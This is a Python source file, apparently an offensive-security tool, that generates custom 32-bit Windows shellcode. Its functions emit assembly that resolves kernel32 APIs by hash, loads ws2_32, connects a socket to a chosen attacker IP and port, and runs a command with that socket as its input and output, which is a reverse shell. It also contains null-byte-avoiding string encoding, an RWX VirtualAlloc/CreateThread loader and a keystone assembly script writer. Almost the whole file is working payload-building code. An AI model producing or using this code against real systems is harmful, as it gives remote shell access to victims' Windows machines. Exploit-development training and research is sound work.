"""
Generate custom shellcode payloads.

Author: wh1rl3y
Date: 2025-07-07
"""
import socket, sys
import ctypes, struct

SUCCESS = 'success'
FAIL = 'fail'


def ror_str(byte, count):
    binb = bin(byte)[2:].zfill(32)
    while count > 0:
        binb = binb[-1] + binb[0:-1]
        count -= 1
    return int(binb, 2)

def calculate_function_hash(function_name, verbose=False):
    print_info(f'Generate hash for {function_name}', SUCCESS, 1, verbose)
    edx = 0x00
    ror_count = 0
    for eax in function_name:
        edx = edx + ord(eax)
        if ror_count < len(function_name) - 1:
            edx = ror_str(edx, 0xd)
        ror_count += 1
    print_info(f'{hex(edx)} = {function_name}', SUCCESS, 2, verbose)
    return hex(edx)

# Helper functions
def print_info(text, status=SUCCESS, level=0, verbose=False):
    if not verbose:
        return
    if level == 0:
        if status == FAIL:
            print(f'[-] {text}')
        else:
            print(f'[+] {text}')
    else:
        padd = ' '*level*5
        print(f'{padd}| {text}')

def print_shellcode(shellcode, language='python', var_name='buf', length=16):
    if language == 'python':
        print(f'{var_name} = b""')
        for index in range(0,len(shellcode)):
            if index%length == 0:
                print (f'{var_name} += b"',end='')
            print(f'\\x{shellcode[index]:02x}', end='')
            if index%length == 15 and index != len(shellcode):
                print (f'"')
        print(f'"')

def print_asm(asm_string):
    print(make_print_friendly_asm(asm_string))


def make_print_friendly_asm(asm_string):
    data = ''
    for cmd in asm_string.split(';'):
        if ':' in cmd:
            c = cmd.split(':')
            data += f'{c[0]}:\n'
            data += f'{c[1]:<60};\n'
        else:
            data += f'{cmd:<60};\n'
    return data

def get_ip_hex(ip_addr):
    try:
        return f"0x{struct.unpack('<I', socket.inet_aton(ip_addr))[0]:08x}";
    except:
        print_info(f'Invalid IP: {ip_addr}', FAIL, 0, True)
        sys.exit()


def get_port_hex(port_num):
    return "0x"+"".join("{:02x}".format(c) for c in struct.pack("<h",port_num))


# Buidling Block functions
def change_command_to_memory_hex (cmd, bad_char_list, verbose): 
    #Adding some spacers to clean the end of command for easier loading into memory
    if len(cmd) % 4 == 0:
        cmd += '\0'*3
    else:
        cmd += '\0'*(3-(len(cmd)%4))
    
    
    # Any text string that we want to execute has to be split into 4 byte chunks
    cmd_chunks =  [cmd[i:i+4] for i in range(0, len(cmd), 4)]
    
    print_info(f'Command Chunks:', SUCCESS, 1, verbose) 
    print_info(f'{cmd_chunks}', SUCCESS, 2, verbose)
    print_info(f'Command Chunks Hex:', SUCCESS, 1, verbose) 
    hex_chunks = []
    for chunk in cmd_chunks:
        negated = ''
        if len(chunk) == 3:
            chunk += '\0'
            hex_value = chunk.encode('utf-8').hex()
            hex_value = hex(~int(hex_value, 16) & ((1 << len(hex_value) * 4) - 1))[2:]
            print_info(f'{chunk} = {chunk.encode('utf-8').hex()} {hex_value} - Negated', SUCCESS, 2, verbose)
            hex_chunks.append({'hex': hex_value, 'func': 'neg'})
        else:
            hex_value = chunk.encode('utf-8').hex()
            print_info (f'{chunk} = {hex_value} {negated}', SUCCESS, 2, verbose)
            hex_chunks.append({'hex': hex_value})
    print_info(f'Command hex Chunks:', SUCCESS, 1, verbose)
    print_info(hex_chunks, SUCCESS, 2, verbose)
    return hex_chunks


def create_asm_start(force_break=False):
    asm = f"start:"
    if force_break:
        asm += f"  int3                        ;"  #   Break on start for debugging !!!! REMOVE BEFORE USE
    asm += f"  mov     ebp, esp                ;"
    asm += f"  add     esp, 0xfffff9f0         ;"  #   Extra space to not clobber the stack, we add (0x00 - 0x210) which gets rid of the NULL bytes
    return asm

def find_kernel32():
    return (
        f"find_kernel32:"
        f"  xor     ecx,ecx                 ;"  #   Zero ECX
        f"  mov     esi,fs:[ecx+0x30]       ;"  #   Set ESI to the pointer to the PEB
        f"  mov     esi,[esi+0x0C]          ;"  #   Set ESI to the LDR in side the PEB PEB->LDR
        f"  mov     esi,[esi+0x1C]          ;"  #   Set ESI to the InInitOrder location PEB->LDR.InInitOrder

        f"next_module:"
        f"  mov     ebx, [esi+0x08]         ;"  #   get the current module's base_address
        f"  mov     edi, [esi+0x20]         ;"  #   get the current module's module_name
        f"  mov     esi, [esi]              ;"  #   get the current module's flink (next module location)
        f"  cmp     [edi+12*2], cx          ;"  #   Check f position 12 == 0x00 because kernel32 for 12 unicode characters refix bytes for unicode
        f"  jne     next_module             ;"  #   Repeat if not found
        
        f"find_function_shorten:"  #
        f"  jmp find_function_shorten_bnc   ;"  #   Short jump

        f"find_function_ret:"  #
        f"  pop esi                         ;"  #   POP the return address from the stack
        f"  mov   [ebp+0x04], esi           ;"  #   Save find_function address for later usage
        f"  jmp resolve_kernel32_funcitons   ;"  #

        f"find_function_shorten_bnc:"  #   
        f"   call find_function_ret         ;"  #   Relative CALL with negative offset

        f"find_function:"  #
        f"  pushad                          ;"  #   Save all registers
                                                #   Base address of kernel32 is in EBX from 
                                                #   Previous step (find_kernel32)
        f"  mov   eax, [ebx+0x3c]           ;"  #   Offset to PE Signature
        f"  mov   edi, [ebx+eax+0x78]       ;"  #   Export Table Directory RVA
        f"  add   edi, ebx                  ;"  #   Export Table Directory VMA
        f"  mov   ecx, [edi+0x18]           ;"  #   NumberOfNames
        f"  mov   eax, [edi+0x20]           ;"  #   AddressOfNames RVA
        f"  add   eax, ebx                  ;"  #   AddressOfNames VMA
        f"  mov   [ebp-4], eax              ;"  #   Save AddressOfNames VMA for later

        f"find_function_loop:"  #
        f"  jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0
        f"  dec   ecx                       ;"  #   Decrement our names counter
        f"  mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA
        f"  mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name
        f"  add   esi, ebx                  ;"  #   Set ESI to the VMA of the current symbol name

        f"compute_hash:"  #
        f"  xor   eax, eax                  ;"  #   NULL EAX
        f"  cdq                             ;"  #   NULL EDX
        f"  cld                             ;"  #   Clear direction

        f"compute_hash_again:"  #
        f"  lodsb                           ;"  #   Load the next byte from esi into al
        f"  test  al, al                    ;"  #   Check for NULL terminator
        f"  jz    compute_hash_finished     ;"  #   If the ZF is set, we've hit the NULL term
        f"  ror   edx, 0x0d                 ;"  #   Rotate edx 13 bits to the right
        f"  add   edx, eax                  ;"  #   Add the new byte to the accumulator
        f"  jmp   compute_hash_again        ;"  #   Next iteration

        f"compute_hash_finished:"  #

        F"find_function_compare: "  #
        f"  cmp   edx, [esp+0x24]           ;"  #   Compare the computed hash with the requested hash
        f"  jnz   find_function_loop        ;"  #   If it doesn't match go back to find_function_loop
        f"  mov   edx, [edi+0x24]           ;"  #   AddressOfNameOrdinals RVA
        f"  add   edx, ebx                  ;"  #   AddressOfNameOrdinals VMA
        f"  mov   cx,  [edx+2*ecx]          ;"  #   Extrapolate the function's ordinal
        f"  mov   edx, [edi+0x1c]           ;"  #   AddressOfFunctions RVA
        f"  add   edx, ebx                  ;"  #   AddressOfFunctions VMA
        f"  mov   eax, [edx+4*ecx]          ;"  #   Get the function RVA
        f"  add   eax, ebx                  ;"  #   Get the function VMA
        f"  mov   [esp+0x1c], eax           ;"  #   Overwrite stack version of eax from pushad

        f"find_function_finished:"  #
        f"  popad                           ;"  #   Restore registers
        f"  ret                             ;"  #
    )

def resolve_kernel32_functions(exec_function='CreateProcessA', verbose=False, force_break=False):
    print_info('Resolving Functions in Kernel32:', SUCCESS, 0, True)
    function_list = ["TerminateProcess", 'LoadLibraryA', exec_function]
    resolve_symbols_string = f"resolve_kernel32_funcitons:"
    counter = 0x10
    if force_break:
        resolve_symbols_string += f"  int3                        ;"  #   Break on start for debugging !!!! REMOVE BEFORE USE
    for function_name in function_list:
        function_hash = calculate_function_hash(function_name, verbose)
        resolve_symbols_string += (f"  push {function_hash} ;"
        f"  call dword ptr [ebp+0x04] ;"
        f"  mov   [ebp+{hex(counter)}], eax ;")
        counter += 0x04

    return resolve_symbols_string

    
def load_ws2_32_and_resolve_symbols():
    return (
        f"load_ws2_32:"  #
        f"  xor   eax, eax                  ;"  #   NULL EAX
        f"  mov   ax, 0x6c6c                ;"  #   Move the end of the string in AX
        f"  push  eax                       ;"  #   Push EAX on the stack with string NULL terminator
        f"  push  0x642e3233                ;"  #   Push part of the string on the stack
        f"  push  0x5f327377                ;"  #   Push another part of the string on the stack
        f"  push  esp                       ;"  #   Push ESP to have a pointer to the string
        f"  call dword ptr [ebp+0x14]       ;"  #   Call LoadLibraryA
        
        f"resolve_symbols_ws2_32:"
        f"  mov   ebx, eax                  ;"  #   Move the base address of ws2_32.dll to EBX
        f"  push  0x3bfcedcb                ;"  #   WSAStartup hash
        f"  call dword ptr [ebp+0x04]       ;"  #   Call find_function
        f"  mov   [ebp+0x1C], eax           ;"  #   Save WSAStartup address for later usage
        f"  push  0xadf509d9                ;"  #   WSASocketA hash
        f"  call dword ptr [ebp+0x04]       ;"  #   Call find_function
        f"  mov   [ebp+0x20], eax           ;"  #   Save WSASocketA address for later usage
        f"  push  0xb32dba0c                ;"  #   WSAConnect hash
        f"  call dword ptr [ebp+0x04]       ;"  #   Call find_function
        f"  mov   [ebp+0x24], eax           ;"  #   Save WSAConnect address for later usage
    )

def create_socket_and_connect(ip_hex, port_hex):
    return (
        f"call_wsastartup:"  #
        f"  mov   eax, esp                  ;"  #   Move ESP to EAX
        f"  mov   cx, 0x590                 ;"  #   Move 0x590 to CX
        f"  sub   eax, ecx                  ;"  #   Substract CX from EAX to avoid overwriting the structure later
        f"  push  eax                       ;"  #   Push lpWSAData
        f"  xor   eax, eax                  ;"  #   NULL EAX
        f"  mov   ax, 0x0202                ;"  #   Move version to AX
        f"  push  eax                       ;"  #   Push wVersionRequired
        f"  call dword ptr [ebp+0x1C]       ;"  #   Call WSAStartup
        
        f"call_wsasocketa:"  #
        f"  xor   eax, eax                  ;"  #   NULL EAX
        f"  push  eax                       ;"  #   Push dwFlags
        f"  push  eax                       ;"  #   Push g
        f"  push  eax                       ;"  #   Push lpProtocolInfo
        f"  mov   al, 0x06                  ;"  #   Move AL, IPPROTO_TCP
        f"  push  eax                       ;"  #   Push protocol
        f"  sub   al, 0x05                  ;"  #   Substract 0x05 from AL, AL = 0x01
        f"  push  eax                       ;"  #   Push type
        f"  inc   eax                       ;"  #   Increase EAX, EAX = 0x02
        f"  push  eax                       ;"  #   Push af
        f"  call dword ptr [ebp+0x20]       ;"  #   Call WSASocketA

        f"call_wsaconnect:"  #
        f"  mov   esi, eax                  ;"  #   Move the SOCKET descriptor to ESI
        f"  xor   eax, eax                  ;"  #   NULL EAX
        f"  push  eax                       ;"  #   Push sin_zero[]
        f"  push  eax                       ;"  #   Push sin_zero[]
        f"  push  {ip_hex}                  ;  "#   Push sin_addr (192.168.119.120)
        f"  mov   ax, {port_hex}            ;"  #   Move the sin_port (443) to AX
        f"  shl   eax, 0x10                 ;"  #   Left shift EAX by 0x10 bytes
        f"  add   ax, 0x02                  ;"  #   Add 0x02 (AF_INET) to AX
        f"  push  eax                       ;"  #   Push sin_port & sin_family
        f"  push  esp                       ;"  #   Push pointer to the sockaddr_in structure
        f"  pop   edi                       ;"  #   Store pointer to sockaddr_in in EDI
        f"  xor   eax, eax                  ;"  #   NULL EAX
        f"  push  eax                       ;"  #   Push lpGQOS
        f"  push  eax                       ;"  #   Push lpSQOS
        f"  push  eax                       ;"  #   Push lpCalleeData
        f"  push  eax                       ;"  #   Push lpCalleeData
        f"  add   al, 0x10                  ;"  #   Set AL to 0x10
        f"  push  eax                       ;"  #   Push namelen
        f"  push  edi                       ;"  #   Push *name
        f"  push  esi                       ;"  #   Push s
        f"  call dword ptr [ebp+0x24]       ;"  #   Call WSAConnect
    )


def create_startup_info_a(count):    
    return (
        f"create_startupinfoa_{count}:"  #
        f"  push  esi                       ;"  #   Push hStdError
        f"  push  esi                       ;"  #   Push hStdOutput
        f"  push  esi                       ;"  #   Push hStdInput
        f"  xor   eax, eax                  ;"  #   NULL EAX   
        f"  push  eax                       ;"  #   Push lpReserved2
        f"  push  eax                       ;"  #   Push cbReserved2 & wShowWindow
        f"  mov   al, 0x80                  ;"  #   Move 0x80 to AL
        f"  xor   ecx, ecx                  ;"  #   NULL ECX
        f"  mov   cx, 0x80                  ;"  #   Move 0x80 to CX
        f"  add   eax, ecx                  ;"  #   Set EAX to 0x100
        f"  push  eax                       ;"  #   Push dwFlags
        f"  xor   eax, eax                  ;"  #   NULL EAX   
        f"  push  eax                       ;"  #   Push dwFillAttribute
        f"  push  eax                       ;"  #   Push dwYCountChars
        f"  push  eax                       ;"  #   Push dwXCountChars
        f"  push  eax                       ;"  #   Push dwYSize
        f"  push  eax                       ;"  #   Push dwXSize
        f"  push  eax                       ;"  #   Push dwY
        f"  push  eax                       ;"  #   Push dwX
        f"  push  eax                       ;"  #   Push lpTitle
        f"  push  eax                       ;"  #   Push lpDesktop
        f"  push  eax                       ;"  #   Push lpReserved
        f"  mov   al, 0x44                  ;"  #   Move 0x44 to AL
        f"  push  eax                       ;"  #   Push cb
        f"  push  esp                       ;"  #   Push pointer to the STARTUPINFOA structure
        f"  pop   edi                       ;"  #   Store pointer to STARTUPINFOA in EDI
    )

def add_negated_value(cmd_hex, verbose):
    packed_value = struct.pack('<I', int(cmd_hex, 16))
    print_info(f'{cmd_hex} <E: {''.join(f'\\x{byte:02x}' for byte in packed_value)}', SUCCESS, 2, verbose)
    return (
        f"  mov   eax, 0x{packed_value.hex()};"  #   Move 0xff9a879b into EAX
        f"  neg   eax                       ;"  #   Negate EAX, EAX = 00657865
        f"  dec   al                        ;"
        f"  push  eax                       ;"  #   Push part of the "cmd.exe" string
    )

def create_command_string(cmd_chunks, count, verbose=False, force_break=False):
    print_info('Command String Hex:', SUCCESS, 1, verbose)
    asm = f"create_command_string_{count}:"
    if force_break:
        asm += f"  int3                        ;"  #   Break on start for debugging !!!! REMOVE BEFORE USE
    for index in range(len(cmd_chunks), 0, -1):
        chunk = cmd_chunks[index-1]
        func = chunk.get('func', 'none')
        if func == 'none':
            packed_value = struct.pack('<I', int(chunk.get('hex'), 16))
            print_info(f'{chunk.get('hex')} <E: {"".join(f"\\x{byte:02x}" for byte in packed_value)}', SUCCESS, 2, verbose)
            asm += f"  push  0x{packed_value.hex()}                ;"  #   Push the remainder of the "cmd.exe" string
        elif func == 'neg':
            asm += add_negated_value(chunk.get('hex'), verbose)
    
    asm += f"  push  esp                       ;"  #   Push pointer to the "cmd.exe" string
    asm += f"  pop   ebx                       ;"  #   Store pointer to the "cmd.exe" string in EBX
    return asm

def create_process_a(count):
    return (
        f"call_createprocessa_{count}:"  #
        f"  mov   eax, esp                  ;"  #   Move ESP to EAX
        f"  xor   ecx, ecx                  ;"  #   NULL ECX
        f"  mov   cx, 0x390                 ;"  #   Move 0x390 to CX
        f"  sub   eax, ecx                  ;"  #   Substract CX from EAX to avoid overwriting the structure later
        f"  push  eax                       ;"  #   Push lpProcessInformation
        f"  push  edi                       ;"  #   Push lpStartupInfo
        f"  xor   eax, eax                  ;"  #   NULL EAX   
        f"  push  eax                       ;"  #   Push lpCurrentDirectory
        f"  push  eax                       ;"  #   Push lpEnvironment
        f"  push  eax                       ;"  #   Push dwCreationFlags
        f"  inc   eax                       ;"  #   Increase EAX, EAX = 0x01 (TRUE)
        f"  push  eax                       ;"  #   Push bInheritHandles
        f"  dec   eax                       ;"  #   NULL EAX
        
        f"  push  eax                       ;"  #   Push lpThreadAttributes
        f"  push  eax                       ;"  #   Push lpProcessAttributes
        f"  push  ebx                       ;"  #   Push lpCommandLine
        f"  push  eax                       ;"  #   Push lpApplicationName
        f"  call dword ptr [ebp+0x18]       ;"  #   Call CreateProcessA
    )

def exec_win(count):
    return (
        f"exec_win_{count}:"                    #
        f"  xor   eax, eax                  ;"  # NULL ECX
        f"  push  eax                       ;"  # Push uCmdShow
        f"  push  ebx                       ;"  # Push lpCmdLine
        f"  call dword ptr [ebp+0x18]       ;"  # Call WinExec
    )

def execute_shellcode(shellcode):
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                              ctypes.c_int(len(shellcode)),
                                              ctypes.c_int(0x3000),
                                              ctypes.c_int(0x40))

    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                         buf,
                                         ctypes.c_int(len(shellcode)))


    print("Shellcode located at address %s" % hex(ptr))
    input("...ENTER TO EXECUTE SHELLCODE...")

    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.c_int(ptr),
                                             ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.pointer(ctypes.c_int(0)))

    
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))

def generate_python_script(asm_code, path):
    script = (
    'from keystone import * \n'
    'import struct\n'
    'try:\n'
    f'    asm_code="{asm_code}"\n'
    '    ks = Ks(KS_ARCH_X86, KS_MODE_32)\n'
    '    encoding, count = ks.asm(asm_code)\n'
    '    sh = b""\n'
    '    for e in encoding:\n'
    '        sh += struct.pack("B", e)\n'
    '    shellcode = bytearray(sh)\n'
    '    for index in range(0,len(shellcode)):\n'
    '        print(f"\\\\x{shellcode[index]:02x}", end="")\n'
    'except Exception as e:\n'
    '    print("Failed to create shellcode:", e)\n')

    with open(path, "w") as file:
        file.write(script)
